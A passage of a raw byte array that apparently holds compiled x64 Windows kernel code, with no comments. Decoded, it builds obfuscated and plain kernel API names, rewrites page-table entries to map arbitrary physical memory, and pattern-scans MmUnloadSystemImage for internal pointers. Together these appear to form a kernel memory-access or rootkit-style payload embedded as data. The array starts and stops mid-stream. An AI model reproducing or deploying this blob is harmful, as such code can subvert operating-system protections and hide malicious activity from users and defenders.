0x24, 0x24, 0x83, 0x00, 0xB4, 0x00, 0xC7, 0x44, 0x24, 0x28, 0x94, 0x00, 0x9E, 0x00, 0xC7, 0x45,
0x83, 0x96, 0x00, 0x80, 0x00, 0xC7, 0x45, 0x87, 0x90, 0x00, 0xA4, 0x00, 0xC7, 0x45, 0x8B, 0x92,
0x00, 0x9F, 0x00, 0xC7, 0x45, 0x8F, 0x90, 0x00, 0x89, 0x00, 0xC7, 0x45, 0x93, 0x8F, 0x00, 0x8E,
0x00, 0xC7, 0x45, 0x97, 0x84, 0x00, 0xA8, 0x00, 0xC7, 0x45, 0x9B, 0x9E, 0x00, 0x6C, 0x01, 0xC7,
0x45, 0x9F, 0x74, 0x01, 0x67, 0x01, 0x48, 0xC7, 0x45, 0xA3, 0x03, 0x01, 0x00, 0x00, 0xE8, 0xFD,
0x30, 0x00, 0x00, 0x48, 0x8B, 0xD0, 0x48, 0x8D, 0x4D, 0xFF, 0xFF, 0x15, 0xC8, 0x53, 0x00, 0x00,
0x48, 0x8B, 0x05, 0x79, 0x53, 0x00, 0x00, 0x48, 0x8D, 0x4D, 0xFF, 0xFF, 0xD0, 0x48, 0x89, 0x05,
0x2C, 0x53, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0x33, 0xC0, 0xC7, 0x44, 0x24, 0x20, 0xBF,
0x00, 0x9A, 0x00, 0x48, 0x89, 0x45, 0xB7, 0x48, 0x89, 0x45, 0xBF, 0x48, 0x89, 0x45, 0xC7, 0x48,
0x89, 0x45, 0xCF, 0x48, 0x89, 0x45, 0xD7, 0x48, 0x89, 0x45, 0xDF, 0x89, 0x45, 0xE7, 0xC7, 0x44,
0x24, 0x24, 0x83, 0x00, 0xB6, 0x00, 0xC7, 0x44, 0x24, 0x28, 0x98, 0x00, 0x9C, 0x00, 0xC7, 0x45,
0x83, 0x97, 0x00, 0xB1, 0x00, 0xC7, 0x45, 0x87, 0x8D, 0x00, 0x86, 0x00, 0xC7, 0x45, 0x8B, 0x98,
0x00, 0x8A, 0x00, 0xC7, 0x45, 0x8F, 0x8D, 0x00, 0x9F, 0x00, 0xC7, 0x45, 0x93, 0x9F, 0x00, 0xAE,
0x00, 0xC7, 0x45, 0x97, 0x92, 0x00, 0x8B, 0x00, 0xC7, 0x45, 0x9B, 0x8B, 0x00, 0x69, 0x01, 0xC7,
0x45, 0x9F, 0x6F, 0x01, 0x67, 0x01, 0xC7, 0x45, 0xA3, 0x41, 0x01, 0x7D, 0x01, 0xC7, 0x45, 0xA7,
0x4B, 0x01, 0x67, 0x01, 0xC7, 0x45, 0xAB, 0x6A, 0x01, 0x6D, 0x01, 0x48, 0xC7, 0x45, 0xAF, 0x09,
0x01, 0x00, 0x00, 0xE8, 0x88, 0x31, 0x00, 0x00, 0x48, 0x8B, 0xD0, 0x48, 0x8D, 0x4D, 0xFF, 0xFF,
0x15, 0x13, 0x53, 0x00, 0x00, 0x48, 0x8D, 0x4D, 0xFF, 0xFF, 0x15, 0xC1, 0x52, 0x00, 0x00, 0x48,
0x8B, 0x05, 0x02, 0x53, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x20, 0xBF, 0x00, 0x9A, 0x00, 0xC7, 0x44,
0x24, 0x24, 0x83, 0x00, 0xB7, 0x00, 0xC7, 0x44, 0x24, 0x28, 0x94, 0x00, 0x86, 0x00, 0xC7, 0x45,
0x83, 0xA5, 0x00, 0x91, 0x00, 0xC7, 0x45, 0x87, 0x87, 0x00, 0x85, 0x00, 0xC7, 0x45, 0x8B, 0x9E,
0x00, 0x97, 0x00, 0xC7, 0x45, 0x8F, 0x97, 0x00, 0xFA, 0x00, 0xC7, 0x45, 0x93, 0x52, 0x00, 0x74,
0x00, 0xC7, 0x45, 0x97, 0x6C, 0x00, 0x47, 0x00, 0xC7, 0x45, 0x9B, 0x65, 0x00, 0x74, 0x00, 0x48,
0x8D, 0x55, 0x93, 0xC7, 0x45, 0x9F, 0x56, 0x00, 0x65, 0x00, 0x48, 0x8D, 0x4D, 0xFF, 0xC7, 0x45,
0xA3, 0x72, 0x00, 0x73, 0x00, 0xC7, 0x45, 0xA7, 0x69, 0x00, 0x6F, 0x00, 0xC7, 0x45, 0xAB, 0x6E,
0x00, 0x00, 0x00, 0xFF, 0xD0, 0x48, 0x8B, 0x05, 0x44, 0x52, 0x00, 0x00, 0x48, 0x8D, 0x4D, 0xFF,
0xFF, 0xD0, 0x48, 0x89, 0x05, 0x9F, 0x52, 0x00, 0x00, 0x48, 0x8D, 0x55, 0x99, 0x48, 0x8B, 0x05,
0x74, 0x52, 0x00, 0x00, 0x48, 0x8D, 0x4D, 0xFF, 0xC7, 0x44, 0x24, 0x20, 0xA0, 0x00, 0x83, 0x00,
0x33, 0xDB, 0xC7, 0x44, 0x24, 0x24, 0xA6, 0x00, 0x83, 0x00, 0xC7, 0x44, 0x24, 0x28, 0xB0, 0x00,
0x96, 0x00, 0xC7, 0x45, 0x83, 0x97, 0x00, 0x86, 0x00, 0xC7, 0x45, 0x87, 0x90, 0x00, 0x85, 0x00,
0xC7, 0x45, 0x8B, 0x84, 0x00, 0xAE, 0x00, 0xC7, 0x45, 0x8F, 0x98, 0x00, 0x96, 0x00, 0xC7, 0x45,
0x93, 0x92, 0x00, 0x98, 0x00, 0xC7, 0x45, 0x97, 0xFD, 0x00, 0x4D, 0x00, 0xC7, 0x45, 0x9B, 0x6D,
0x00, 0x49, 0x00, 0xC7, 0x45, 0x9F, 0x73, 0x00, 0x41, 0x00, 0xC7, 0x45, 0xA3, 0x64, 0x00, 0x64,
0x00, 0xC7, 0x45, 0xA7, 0x72, 0x00, 0x65, 0x00, 0xC7, 0x45, 0xAB, 0x73, 0x00, 0x73, 0x00, 0xC7,
0x45, 0xAF, 0x56, 0x00, 0x61, 0x00, 0xC7, 0x45, 0xB3, 0x6C, 0x00, 0x69, 0x00, 0xC7, 0x45, 0xB7,
0x64, 0x00, 0x00, 0x00, 0xFF, 0xD0, 0x48, 0x8B, 0x05, 0xA3, 0x51, 0x00, 0x00, 0x48, 0x8D, 0x4D,
0xFF, 0xFF, 0xD0, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0x48, 0x89, 0x05, 0xC9, 0x50, 0x00, 0x00, 0xC7,
0x44, 0x24, 0x20, 0xBF, 0x00, 0x9A, 0x00, 0xC7, 0x44, 0x24, 0x24, 0x83, 0x00, 0xB3, 0x00, 0xC7,
0x44, 0x24, 0x28, 0x9E, 0x00, 0x9F, 0x00, 0xC7, 0x45, 0x83, 0x83, 0x00, 0x95, 0x00, 0xC7, 0x45,
0x87, 0x87, 0x00, 0x93, 0x00, 0xC7, 0x45, 0x8B, 0xA2, 0x00, 0x96, 0x00, 0xC7, 0x45, 0x8F, 0x90,
0x00, 0x99, 0x00, 0xC7, 0x45, 0x93, 0x94, 0x00, 0x98, 0x00, 0xC7, 0x45, 0x97, 0x98, 0x00, 0xAD,
0x00, 0xC7, 0x45, 0x9B, 0x8B, 0x00, 0x72, 0x01, 0xC7, 0x45, 0x9F, 0x68, 0x01, 0x6C, 0x01, 0x48,
0xC7, 0x45, 0xA3, 0x64, 0x01, 0x04, 0x01, 0x48, 0x89, 0x5D, 0xAB, 0x48, 0x89, 0x5D, 0xB3, 0x48,
0x89, 0x5D, 0xBB, 0x48, 0x89, 0x5D, 0xC3, 0x48, 0x89, 0x5D, 0xCB, 0x89, 0x5D, 0xD3, 0xE8, 0x7D,
0x29, 0x00, 0x00, 0x48, 0x8B, 0xD0, 0x48, 0x8D, 0x4D, 0xFF, 0xFF, 0x15, 0x58, 0x51, 0x00, 0x00,
0x48, 0x8B, 0x05, 0x09, 0x51, 0x00, 0x00, 0x48, 0x8D, 0x4D, 0xFF, 0xFF, 0xD0, 0x48, 0x8D, 0x0D,
0xCC, 0x51, 0x00, 0x00, 0x48, 0x89, 0x05, 0x4D, 0x51, 0x00, 0x00, 0xFF, 0x15, 0x57, 0x51, 0x00,
0x00, 0x8B, 0x05, 0xBD, 0x51, 0x00, 0x00, 0x83, 0xC0, 0xF6, 0x83, 0xF8, 0x01, 0x0F, 0x87, 0x4E,
0x01, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x1E, 0x51, 0x00, 0x00, 0x48, 0x8D, 0x55, 0x9F, 0x48, 0x8D,
0x4D, 0x0F, 0xC7, 0x45, 0x67, 0x40, 0xB7, 0x01, 0x48, 0x66, 0xC7, 0x45, 0x6B, 0x8B, 0xCE, 0xC6,
0x45, 0x6D, 0xE8, 0x48, 0x89, 0x1D, 0xBE, 0x50, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x20, 0xA0, 0x00,
0x83, 0x00, 0xC7, 0x44, 0x24, 0x24, 0xBA, 0x00, 0x9E, 0x00, 0xC7, 0x44, 0x24, 0x28, 0x9D, 0x00,
0x9D, 0x00, 0xC7, 0x45, 0x83, 0x92, 0x00, 0x90, 0x00, 0xC7, 0x45, 0x87, 0xA6, 0x00, 0x8F, 0x00,
0xC7, 0x45, 0x8B, 0x84, 0x00, 0x8C, 0x00, 0xC7, 0x45, 0x8F, 0x9C, 0x00, 0x97, 0x00, 0xC7, 0x45,
0x93, 0xB2, 0x00, 0x91, 0x00, 0xC7, 0x45, 0x97, 0x9C, 0x00, 0x99, 0x00, 0xC7, 0x45, 0x9B, 0x9A,
0x00, 0x00, 0x01, 0xC7, 0x45, 0x9F, 0x4D, 0x00, 0x6D, 0x00, 0xC7, 0x45, 0xA3, 0x55, 0x00, 0x6E,
0x00, 0xC7, 0x45, 0xA7, 0x6C, 0x00, 0x6F, 0x00, 0xC7, 0x45, 0xAB, 0x61, 0x00, 0x64, 0x00, 0xC7,
0x45, 0xAF, 0x53, 0x00, 0x79, 0x00, 0xC7, 0x45, 0xB3, 0x73, 0x00, 0x74, 0x00, 0xC7, 0x45, 0xB7,
0x65, 0x00, 0x6D, 0x00, 0xC7, 0x45, 0xBB, 0x49, 0x00, 0x6D, 0x00, 0xC7, 0x45, 0xBF, 0x61, 0x00,
0x67, 0x00, 0xC7, 0x45, 0xC3, 0x65, 0x00, 0x00, 0x00, 0xFF, 0xD0, 0x48, 0x8B, 0x05, 0x1E, 0x50,
0x00, 0x00, 0x48, 0x8D, 0x4D, 0x0F, 0xFF, 0xD0, 0x48, 0x8B, 0xD8, 0x48, 0x85, 0xC0, 0x0F, 0x84,
0x7D, 0x00, 0x00, 0x00, 0x48, 0x8D, 0xB8, 0x00, 0x05, 0x00, 0x00, 0x48, 0x3B, 0xC7, 0x73, 0x71,
0x41, 0xB8, 0x07, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x55, 0x67, 0x48, 0x8B, 0xCB, 0xFF, 0x15, 0xFD,
0x3A, 0x00, 0x00, 0x48, 0x83, 0xF8, 0x07, 0x74, 0x0A, 0x48, 0xFF, 0xC3, 0x48, 0x3B, 0xDF, 0x72,
0xDF, 0xEB, 0x4E, 0x48, 0x63, 0x43, 0x07, 0x48, 0x83, 0xC0, 0x0B, 0x48, 0x03, 0xC3, 0x74, 0x41,
0x48, 0x8D, 0x88, 0x00, 0x06, 0x00, 0x00, 0x48, 0x3B, 0xC1, 0x73, 0x35, 0x0F, 0x1F, 0x40, 0x00,
0x80, 0x38, 0xE8, 0x75, 0x0C, 0x80, 0x78, 0x05, 0x8B, 0x75, 0x06, 0x80, 0x78, 0x06, 0x05, 0x74,
0x0A, 0x48, 0xFF, 0xC0, 0x48, 0x3B, 0xC1, 0x72, 0xE7, 0xEB, 0x16, 0x48, 0x8D, 0x48, 0x01, 0x48,
0x63, 0x40, 0x01, 0x48, 0x83, 0xC1, 0x04, 0x48, 0x03, 0xC8, 0x48, 0x89, 0x0D, 0x97, 0x4F, 0x00,
0x00, 0x48, 0x8B, 0x9C, 0x24, 0x20, 0x01, 0x00, 0x00, 0x48, 0x81, 0xC4, 0xD0, 0x00, 0x00, 0x00,
0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x5F, 0x5E, 0x5D, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC,
0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B, 0x05, 0x6B, 0x4F, 0x00, 0x00, 0x48, 0x8B, 0xD9,
0x48, 0x85, 0xC0, 0x74, 0x42, 0x48, 0x8B, 0x49, 0x28, 0x33, 0xD2, 0xFF, 0xD0, 0x48, 0x8B, 0x53,
0x28, 0x48, 0x89, 0x12, 0x48, 0x8D, 0x42, 0x10, 0x48, 0x89, 0x00, 0x48, 0x89, 0x42, 0x18, 0x48,
0x8D, 0x42, 0x20, 0x48, 0x89, 0x00, 0x48, 0x89, 0x42, 0x28, 0x33, 0xC0, 0x48, 0x89, 0x52, 0x08,
0x48, 0x89, 0x43, 0x28, 0x48, 0x89, 0x43, 0x18, 0x89, 0x43, 0x20, 0x48, 0x89, 0x43, 0x68, 0x48,
0x89, 0x43, 0x58, 0x48, 0x89, 0x43, 0x08, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC,
0x40, 0x53, 0x41, 0x56, 0x48, 0x83, 0xEC, 0x58, 0x4C, 0x8B, 0x94, 0x24, 0x98, 0x00, 0x00, 0x00,
0x4D, 0x8B, 0xF1, 0x48, 0x8B, 0xD9, 0x4D, 0x85, 0xC9, 0x0F, 0x84, 0x0D, 0x04, 0x00, 0x00, 0x4C,
0x8B, 0x9C, 0x24, 0x90, 0x00, 0x00, 0x00, 0x4D, 0x85, 0xDB, 0x0F, 0x84, 0xFC, 0x03, 0x00, 0x00,
0x4D, 0x85, 0xD2, 0x0F, 0x84, 0xF3, 0x03, 0x00, 0x00, 0x48, 0x89, 0x6C, 0x24, 0x70, 0x4D, 0x8B,
0xC8, 0x48, 0x89, 0x74, 0x24, 0x78, 0x49, 0x8B, 0xE8, 0x4C, 0x89, 0x7C, 0x24, 0x40, 0x4D, 0x8B,
0xF8, 0x49, 0xC1, 0xEF, 0x1E, 0x49, 0xC1, 0xE9, 0x27, 0x48, 0xC1, 0xED, 0x15, 0x49, 0x39, 0x12,
0x74, 0x1D, 0x33, 0xC0, 0x49, 0x89, 0x42, 0x08, 0x49, 0x89, 0x42, 0x10, 0x49, 0x89, 0x42, 0x18,
0x49, 0x89, 0x42, 0x20, 0x49, 0x89, 0x42, 0x28, 0x49, 0x89, 0x42, 0x30, 0x49, 0x89, 0x12, 0x48,
0xBE, 0xFF, 0x0F, 0x00, 0x00, 0x00, 0x00, 0xF0, 0xFF, 0x48, 0x89, 0xBC, 0x24, 0x80, 0x00, 0x00,
0x00, 0x4C, 0x89, 0x64, 0x24, 0x50, 0x4C, 0x8D, 0x61, 0x10, 0x4D, 0x39, 0x4A, 0x10, 0x0F, 0x84,
0x82, 0x00, 0x00, 0x00, 0x49, 0x8B, 0x0C, 0x24, 0x49, 0x8B, 0xC1, 0x25, 0xFF, 0x01, 0x00, 0x00,
0x48, 0x81, 0xE2, 0x00, 0xF0, 0xFF, 0xFF, 0x48, 0x8D, 0x3C, 0xC5, 0x00, 0x00, 0x00, 0x00, 0x48,
0x8B, 0x01, 0x48, 0x23, 0xC6, 0x48, 0x03, 0xD7, 0x48, 0x81, 0xE2, 0x03, 0xF1, 0xFF, 0xFF, 0x48,
0x0B, 0xC2, 0x48, 0x0D, 0x03, 0x01, 0x00, 0x00, 0x48, 0x89, 0x01, 0x48, 0x8B, 0x03, 0x0F, 0x01,
0x38, 0x48, 0x8D, 0x34, 0x07, 0xB9, 0x08, 0x00, 0x00, 0x00, 0x48, 0x8D, 0xBC, 0x24, 0x88, 0x00,
0x00, 0x00, 0xF3, 0xA4, 0x48, 0x8B, 0x84, 0x24, 0x88, 0x00, 0x00, 0x00, 0xA8, 0x01, 0x0F, 0x84,
0xB0, 0x00, 0x00, 0x00, 0x49, 0x89, 0x42, 0x08, 0x48, 0xBE, 0xFF, 0x0F, 0x00, 0x00, 0x00, 0x00,
0xF0, 0xFF, 0x4D, 0x89, 0x4A, 0x10, 0x49, 0xC7, 0x42, 0x20, 0xFF, 0xFF, 0xFF, 0xFF, 0x49, 0xC7,
0x42, 0x30, 0xFF, 0xFF, 0xFF, 0xFF, 0x49, 0x8B, 0x4A, 0x08, 0x4C, 0x89, 0x6C, 0x24, 0x48, 0x49,
0xBD, 0x00, 0xF0, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x48, 0x89, 0x8C, 0x24, 0x88, 0x00, 0x00,
0x00, 0x4D, 0x39, 0x7A, 0x20, 0x0F, 0x84, 0x9E, 0x00, 0x00, 0x00, 0x49, 0x8B, 0x14, 0x24, 0x49,
0x23, 0xCD, 0x49, 0x8B, 0xC7, 0x25, 0xFF, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x3C, 0xC5, 0x00, 0x00,
0x00, 0x00, 0x48, 0x8D, 0x04, 0x39, 0x48, 0x8B, 0x0A, 0x48, 0x25, 0x03, 0xF1, 0xFF, 0xFF, 0x48,
0x23, 0xCE, 0x48, 0x0B, 0xC8, 0x48, 0x81, 0xC9, 0x03, 0x01, 0x00, 0x00, 0x48, 0x89, 0x0A, 0x48,
0x8B, 0x03, 0x0F, 0x01, 0x38, 0x48, 0x8D, 0x34, 0x07, 0xB9, 0x08, 0x00, 0x00, 0x00, 0x48, 0x8D,
0x7C, 0x24, 0x20, 0xF3, 0xA4, 0x48, 0x8B, 0x44, 0x24, 0x20, 0xA8, 0x01, 0x74, 0x1D, 0x49, 0x89,
0x42, 0x18, 0x4C, 0x8D, 0x4B, 0x10, 0x4D, 0x89, 0x7A, 0x20, 0x49, 0xC7, 0x42, 0x30, 0xFF, 0xFF,
0xFF, 0xFF, 0xEB, 0x38, 0xB8, 0x06, 0x01, 0x00, 0x00, 0xEB, 0x0A, 0xB8, 0x07, 0x01, 0x00, 0x00,
0x4C, 0x8B, 0x6C, 0x24, 0x48, 0x4C, 0x8B, 0x64, 0x24, 0x50, 0x48, 0x8B, 0xBC, 0x24, 0x80, 0x00,
0x00, 0x00, 0x48, 0x8B, 0x74, 0x24, 0x78, 0x48, 0x8B, 0x6C, 0x24, 0x70, 0x4C, 0x8B, 0x7C, 0x24,
0x40, 0x48, 0x83, 0xC4, 0x58, 0x41, 0x5E, 0x5B, 0xC3, 0x4D, 0x8B, 0xCC, 0x49, 0x8B, 0x72, 0x18,
0x48, 0x89, 0x74, 0x24, 0x20, 0x40, 0x84, 0xF6, 0x79, 0x75, 0x48, 0xB8, 0x00, 0x00, 0x00, 0xC0,
0xFF, 0xFF, 0x0F, 0x00, 0x49, 0xC7, 0x03, 0x00, 0x00, 0x00, 0x40, 0x48, 0x23, 0xF0, 0x48, 0x8B,
0x05, 0x5B, 0x4D, 0x00, 0x00, 0x49, 0x89, 0x36, 0x49, 0x8B, 0x3B, 0x48, 0xFF, 0xCF, 0x48, 0x03,
0xFE, 0x48, 0x85, 0xC0, 0x75, 0x12, 0xFF, 0x15, 0xDC, 0x37, 0x00, 0x00, 0x48, 0x89, 0x05, 0x3D,
0x4D, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x16, 0x48, 0x8D, 0x50, 0x08, 0x0F, 0x1F, 0x40, 0x00,
0x48, 0x8B, 0x4A, 0xF8, 0x48, 0x85, 0xC9, 0x75, 0x0F, 0x48, 0x39, 0x0A, 0x75, 0x0F, 0xB8, 0x0A,
0x01, 0x00, 0x00, 0xE9, 0x68, 0xFF, 0xFF, 0xFF, 0x48, 0x3B, 0xF1, 0x72, 0x0C, 0x48, 0x03, 0x0A,
0x48, 0x3B, 0xF9, 0x0F, 0x82, 0xB2, 0x01, 0x00, 0x00, 0x48, 0x83, 0xC2, 0x10, 0xEB, 0xD1, 0x49,
0xBF, 0xFF, 0x0F, 0x00, 0x00, 0x00, 0x00, 0xF0, 0xFF, 0x49, 0x39, 0x6A, 0x30, 0x74, 0x5B, 0x49,
0x8B, 0x14, 0x24, 0x48, 0x8B, 0xC5, 0x25, 0xFF, 0x01, 0x00, 0x00, 0x49, 0x23, 0xF5, 0x48, 0x8B,
0x0A, 0x48, 0x8D, 0x3C, 0xC5, 0x00, 0x00, 0x00, 0x00, 0x49, 0x23, 0xCF, 0x48, 0x8D, 0x04, 0x3E,
0x48, 0x25, 0x03, 0xF1, 0xFF, 0xFF, 0x48, 0x0B, 0xC8, 0x48, 0x81, 0xC9, 0x03, 0x01, 0x00, 0x00,
0x48, 0x89, 0x0A, 0x48, 0x8B, 0x03, 0x0F, 0x01, 0x38, 0x48, 0x8D, 0x34, 0x07, 0xB9, 0x08, 0x00,
0x00, 0x00, 0x48, 0x8D, 0x7C, 0x24, 0x28, 0xF3, 0xA4, 0x48, 0x8B, 0x44, 0x24, 0x28, 0xA8, 0x01,
0x74, 0x76, 0x49, 0x89, 0x42, 0x28, 0x49, 0x89, 0x6A, 0x30, 0x49, 0x8B, 0x7A, 0x28, 0x48, 0x89,
0x7C, 0x24, 0x28, 0x40, 0x84, 0xFF, 0x0F, 0x89, 0x7D, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x00, 0x00,
0xE0, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x49, 0xC7, 0x03, 0x00, 0x00, 0x20, 0x00, 0x48, 0x23, 0xF8,
0x48, 0x8B, 0x05, 0x69, 0x4C, 0x00, 0x00, 0x49, 0x89, 0x3E, 0x49, 0x8B, 0x33, 0x48, 0xFF, 0xCE,
0x48, 0x03, 0xF7, 0x48, 0x85, 0xC0, 0x75, 0x12, 0xFF, 0x15, 0xEA, 0x36, 0x00, 0x00, 0x48, 0x89,
0x05, 0x4B, 0x4C, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x14, 0x48, 0x8D, 0x50, 0x08, 0x66, 0x90,
0x48, 0x8B, 0x4A, 0xF8, 0x48, 0x85, 0xC9, 0x75, 0x19, 0x48, 0x39, 0x0A, 0x75, 0x19, 0xB8, 0x0B,
0x01, 0x00, 0x00, 0xE9, 0x78, 0xFE, 0xFF, 0xFF, 0xB8, 0x08, 0x01, 0x00, 0x00, 0xE9, 0x6E, 0xFE,
0xFF, 0xFF, 0x48, 0x3B, 0xF9, 0x72, 0x0C, 0x48, 0x03, 0x0A, 0x48, 0x3B, 0xF1, 0x0F, 0x82, 0xB8,
0x00, 0x00, 0x00, 0x48, 0x83, 0xC2, 0x10, 0xEB, 0xC7, 0x49, 0xC1, 0xE8, 0x0C, 0x49, 0x23, 0xFD,
0x41, 0x81, 0xE0, 0xFF, 0x01, 0x00, 0x00, 0x4A, 0x8D, 0x04, 0xC7, 0x49, 0x8B, 0x39, 0x48, 0x25,
0x03, 0xF1, 0xFF, 0xFF, 0x48, 0x8B, 0x17, 0x49, 0x23, 0xD7, 0x48, 0x0B, 0xD0, 0x48, 0x81, 0xCA,
0x03, 0x01, 0x00, 0x00, 0x48, 0x89, 0x17, 0x48, 0x8B, 0x03, 0x0F, 0x01, 0x38, 0x4A, 0x8D, 0x34,
0xC0, 0xB9, 0x08, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x7C, 0x24, 0x30, 0xF3, 0xA4, 0x48, 0x8B, 0x7C,
0x24, 0x30, 0x40, 0xF6, 0xC7, 0x01, 0x74, 0x6A, 0x48, 0x8B, 0x05, 0xB1, 0x4B, 0x00, 0x00, 0x49,
0x23, 0xFD, 0x49, 0xC7, 0x03, 0x00, 0x10, 0x00, 0x00, 0x49, 0x89, 0x3E, 0x49, 0x8B, 0x33, 0x48,
0xFF, 0xCE, 0x48, 0x03, 0xF7, 0x48, 0x85, 0xC0, 0x75, 0x12, 0xFF, 0x15, 0x28, 0x36, 0x00, 0x00,
0x48, 0x89, 0x05, 0x89, 0x4B, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x12, 0x48, 0x8D, 0x50, 0x08,
0x48, 0x8B, 0x4A, 0xF8, 0x48, 0x85, 0xC9, 0x75, 0x0F, 0x48, 0x39, 0x0A, 0x75, 0x0F, 0xB8, 0x0C,
0x01, 0x00, 0x00, 0xE9, 0xB8, 0xFD, 0xFF, 0xFF, 0x48, 0x3B, 0xF9, 0x72, 0x08, 0x48, 0x03, 0x0A,
0x48, 0x3B, 0xF1, 0x72, 0x06, 0x48, 0x83, 0xC2, 0x10, 0xEB, 0xD5, 0x33, 0xC0, 0xE9, 0x9E, 0xFD,
0xFF, 0xFF, 0xB8, 0x09, 0x01, 0x00, 0x00, 0xE9, 0x94, 0xFD, 0xFF, 0xFF, 0xB8, 0x16, 0x00, 0x00,
0x00, 0x48, 0x83, 0xC4, 0x58, 0x41, 0x5E, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
0x4C, 0x8B, 0xDC, 0x49, 0x89, 0x5B, 0x20, 0x55, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57,
0x48, 0x83, 0xEC, 0x40, 0x4D, 0x8B, 0xE9, 0x49, 0x8B, 0xD8, 0x4C, 0x8B, 0xE2, 0x4C, 0x8B, 0xF1,
0x4D, 0x85, 0xC0, 0x0F, 0x84, 0x3E, 0x01, 0x00, 0x00, 0x4D, 0x85, 0xC9, 0x0F, 0x84, 0x35, 0x01,
0x00, 0x00, 0x8B, 0xAC, 0x24, 0x90, 0x00, 0x00, 0x00, 0x85, 0xED, 0x0F, 0x84, 0x26, 0x01, 0x00,
0x00, 0x48, 0x85, 0xC9, 0x0F, 0x84, 0x1D, 0x01, 0x00, 0x00, 0x4C, 0x8B, 0xBC, 0x24, 0x98, 0x00,
0x00, 0x00, 0x4D, 0x85, 0xFF, 0x0F, 0x84, 0x0C, 0x01, 0x00, 0x00, 0x48, 0x85, 0xD2, 0x0F, 0x84,
0x03, 0x01, 0x00, 0x00, 0x33, 0xD2, 0x49, 0x89, 0x73, 0x08, 0x49, 0x89, 0x53, 0xC8, 0x48, 0x8B,
0xC3, 0x49, 0x89, 0x53, 0x18, 0x49, 0x89, 0x7B, 0x10, 0x0F, 0x1F, 0x80, 0x00, 0x00, 0x00, 0x00,
0x48, 0x3B, 0xD8, 0x72, 0x42, 0x48, 0x8D, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0x4C, 0x89, 0x7C,
0x24, 0x28, 0x4C, 0x8D, 0x4C, 0x24, 0x30, 0x48, 0x89, 0x44, 0x24, 0x20, 0x4C, 0x8B, 0xC3, 0x49,
0x8B, 0xD4, 0x49, 0x8B, 0xCE, 0xE8, 0x16, 0xFB, 0xFF, 0xFF, 0x85, 0xC0, 0x0F, 0x85, 0x95, 0x00,
0x00, 0x00, 0x48, 0x8B, 0x94, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x42, 0xFF, 0x48, 0xF7,
0xD0, 0x48, 0x23, 0xC3, 0x48, 0x03, 0xC2, 0x49, 0x8B, 0x7E, 0x10, 0x48, 0x8D, 0x72, 0xFF, 0x48,
0x23, 0xF3, 0xBA, 0x00, 0x10, 0x00, 0x00, 0x48, 0x03, 0x74, 0x24, 0x30, 0x44, 0x8B, 0xC5, 0x8B,
0xCE, 0x81, 0xE1, 0xFF, 0x0F, 0x00, 0x00, 0x2B, 0xD1, 0x48, 0xB9, 0xFF, 0x0F, 0x00, 0x00, 0x00,
0x00, 0xF0, 0xFF, 0x3B, 0xEA, 0x44, 0x0F, 0x43, 0xC2, 0x48, 0x8B, 0x17, 0x48, 0x23, 0xD1, 0x48,
0x8B, 0xCE, 0x48, 0x81, 0xE1, 0x03, 0xF1, 0xFF, 0xFF, 0x48, 0x0B, 0xD1, 0x48, 0x81, 0xCA, 0x03,
0x01, 0x00, 0x00, 0x48, 0x89, 0x17, 0x49, 0x8B, 0x0E, 0x0F, 0x01, 0x39, 0x81, 0xE6, 0xFF, 0x0F,
0x00, 0x00, 0x49, 0x8B, 0xFD, 0x48, 0x03, 0xF1, 0x4D, 0x03, 0xE8, 0x49, 0x03, 0xD8, 0x41, 0x8B,
0xC8, 0xF3, 0xA4, 0x41, 0x2B, 0xE8, 0x74, 0x0D, 0x48, 0x8B, 0x94, 0x24, 0x80, 0x00, 0x00, 0x00,
0xE9, 0x3B, 0xFF, 0xFF, 0xFF, 0x33, 0xC0, 0x48, 0x8B, 0x74, 0x24, 0x70, 0x48, 0x8B, 0x7C, 0x24,
0x78, 0x48, 0x8B, 0x9C, 0x24, 0x88, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5F, 0x41,
0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x5D, 0xC3, 0xB8, 0x16, 0x00, 0x00, 0x00, 0xEB, 0xE3, 0xCC, 0xCC,
0x4C, 0x8B, 0xDC, 0x49, 0x89, 0x5B, 0x20, 0x55, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57,
0x48, 0x83, 0xEC, 0x40, 0x4D, 0x8B, 0xE9, 0x49, 0x8B, 0xD8, 0x4C, 0x8B, 0xE2, 0x4C, 0x8B, 0xF1,
0x4D, 0x85, 0xC0, 0x0F, 0x84, 0x3E, 0x01, 0x00, 0x00, 0x4D, 0x85, 0xC9, 0x0F, 0x84, 0x35, 0x01,
0x00, 0x00, 0x8B, 0xAC, 0x24, 0x90, 0x00, 0x00, 0x00, 0x85, 0xED, 0x0F, 0x84, 0x26, 0x01, 0x00,
0x00, 0x48, 0x85, 0xC9, 0x0F, 0x84, 0x1D, 0x01, 0x00, 0x00, 0x4C, 0x8B, 0xBC, 0x24, 0x98, 0x00,
0x00, 0x00, 0x4D, 0x85, 0xFF, 0x0F, 0x84, 0x0C, 0x01, 0x00, 0x00, 0x48, 0x85, 0xD2, 0x0F, 0x84,
